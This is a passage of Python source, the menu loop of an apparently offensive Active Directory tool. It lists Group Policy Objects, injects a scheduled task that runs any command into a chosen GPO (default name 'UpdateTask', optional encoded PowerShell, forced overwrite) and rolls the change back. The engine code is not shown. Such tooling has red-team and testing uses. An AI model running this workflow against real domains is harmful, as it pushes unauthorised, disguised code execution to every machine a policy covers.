        if choice == '0':
            print(Fore.YELLOW + "\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            break

        if choice == '1':
            engine.enumerate_gpos()

        elif choice == '2':
            print(Fore.CYAN + "\n[?] Task Configuration:" + Style.RESET_ALL)

            gpo_id = get_input(
                Fore.CYAN + "[?] GPO ID (GUID without braces): " + Style.RESET_ALL,
                validate_guid, "Invalid GUID format!"
            )

            task_name = get_input(
                Fore.CYAN + "[?] Task name: " + Style.RESET_ALL,
                default="UpdateTask"
            )

            command = get_input(
                Fore.CYAN + "[?] Command to run: " + Style.RESET_ALL
            )

            ps = get_input(
                Fore.CYAN + "[?] Use PowerShell encoding? (y/N): " + Style.RESET_ALL,
                default="N"
            )
            powershell = ps.lower() in ('y', 'yes')

            force = get_input(
                Fore.CYAN + "[?] Force overwrite if exists? (y/N): " + Style.RESET_ALL,
                default="N"
            )
            force_mode = force.lower() in ('y', 'yes')

            gpo_type = get_input(
                Fore.CYAN + "[?] GPO type [computer/user]: " + Style.RESET_ALL,
                default="computer"
            )

            engine.add_scheduled_task(gpo_id, task_name, command, powershell, gpo_type, force_mode)

        elif choice == '3':
            gpo_id = get_input(
                Fore.CYAN + "[?] GPO ID to rollback: " + Style.RESET_ALL,
                validate_guid, "Invalid GUID format!"
            )

            gpo_type = get_input(
                Fore.CYAN + "[?] GPO type [computer/user]: " + Style.RESET_ALL,
                default="computer"
            )

            engine.rollback(gpo_id, gpo_type)

        get_input(Fore.YELLOW + "\n[*] Press Enter to continue..." + Style.RESET_ALL, allow_empty=True)


if __name__ == '__main__':
    main()
